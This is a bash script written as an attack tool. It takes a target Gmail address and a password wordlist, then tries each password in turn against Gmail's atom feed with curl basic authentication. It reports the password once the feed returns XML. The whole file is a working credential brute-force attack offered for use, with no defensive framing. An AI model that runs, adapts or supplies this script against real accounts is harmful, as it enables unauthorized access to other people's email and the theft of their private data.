#!/bin/bash
####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved
#### Created: 14-01-2019 
####



requirements_gmail() {
if [[ -n $(curl -v &> /dev/null) ]]; then
    echo "Curl is required for this tool, aborted."
    exit 1
fi
}


gmail_attack() {
if [[ -n $(curl -v &> /dev/null) ]]; then
    echo "Curl is required for this tool, aborted."
        exit 1
fi

read -p $'Email: ' mail
if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then
   echo -e "Error: email address $email is invalid, aborted."
   exit 0
fi
read -p $'Wordlist: ' wordlist
if [[ ! -a $wordlist ]]; then
   echo "Error: There is no such wordlist, aborted"
   exit 0
fi

   echo -e ""
   echo -e "IP: $(curl -s https://nr1.nu/ip/ | sed -n '27p')"
   echo -e "Target: $mail"
   echo -e "Wordlist: $(pwd)/$wordlist"
   echo -e ""
   read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
if [ $ready = "yes" ]; then                                                                                                                                               # Check IP and ask user if he is ready
   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
while read -r line; do
name="$line"
attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"                                                                                    # If password is correct, then we can grab xml
if [ -z "$attack" ]; then
   echo ""
   echo -e "Wrong Password for $mail: \e[1;31m$name\e[0m"                                                                                              # If there is no xml output, then pw is wrong
   sleep 1                                                                                                                                                                # and we will let the user know this by echo to stdout
fi

if [ -n "$attack" ]; then
   echo -e "---------------------------------------------------------------------------------------"
   echo -e  "Password Has Been Found: $name\n"
   echo -e "---------------------------------------------------------------------------------------"
   exit
fi
done < "$wordlist"
   echo -e ""
   echo -e  "Sorry, no passwords in $wordlist matched $mail current password. "
   echo -e   "Try your luck with another mwordlist instead..."
   exit
else
   echo -e "Aborted."
   echo -e " ---------------------------------------------------------------------------------------"
fi
}
